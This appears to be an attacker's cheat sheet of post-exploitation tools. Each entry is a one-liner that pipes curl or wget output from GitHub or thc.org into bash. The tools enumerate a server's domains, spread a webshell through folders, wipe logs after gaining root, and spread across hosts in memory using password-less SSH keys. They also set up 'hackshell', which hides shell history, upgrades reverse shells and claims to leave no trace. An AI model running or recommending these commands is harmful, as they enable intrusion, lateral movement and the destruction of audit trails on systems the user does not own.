netstat if there is no netstat/ss/lsof:
```sh
curl -fsSL https://raw.githubusercontent.com/oxygencall/tools/master/awk_netstat.sh | bash
```
Show all domains hosted on a server + system-information :
```sh
curl -fsSL https://raw.githubusercontent.com/oxygencall/tools/master/what_server.sh | bash
```
Spreading your webshell to the deepest destination folder 
```sh
wget https://raw.githubusercontent.com/oxygencall/tools/master/dor
```
Encrypt ur PHP Code
```php
php ob.php
```
Clear all logs if gain root
```sh
wget https://raw.githubusercontent.com/oxygencall/tools/master/clear.sh
```
The Berserker looks for password-less ssh-keys (such as ~/.ssh/id_rsa) and then attempts to log in to as many hosts as possible. It repeats its action recursively. All this without writing or installing any data on any host. It’s an in-memory infiltration only.
```sh
export BS="$(curl -fsSL https://raw.githubusercontent.com/oxygencall/tools/master/bs)" && bash -c "BS_DEPTH=1 $BS"

# hackshell
Make BASH stealthy and hacker friendly with lots of bash functions

Usage:
```shell
 source <(curl -SsfL https://thc.org/hs)
```

```shell
 source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
```

Some features:
*  unsets HISTFILE, SSH_CONNECT, wget/redis/mysql/less-HISTORY, ...
*  Upgrates to PTY shell (if reverse shell)
*  Creates hacker-friendly shortcuts, bash-functions and aliases
*  Static binary download by simple `bin <command>` (e.g. `bin nmap`)
*  Does not write ANY data to the harddrive
*  Leaves no trace
 
![hackshell](https://github.com/user-attachments/assets/fe4e9f4c-d0f6-4886-8f2f-ef7e3f86b406)
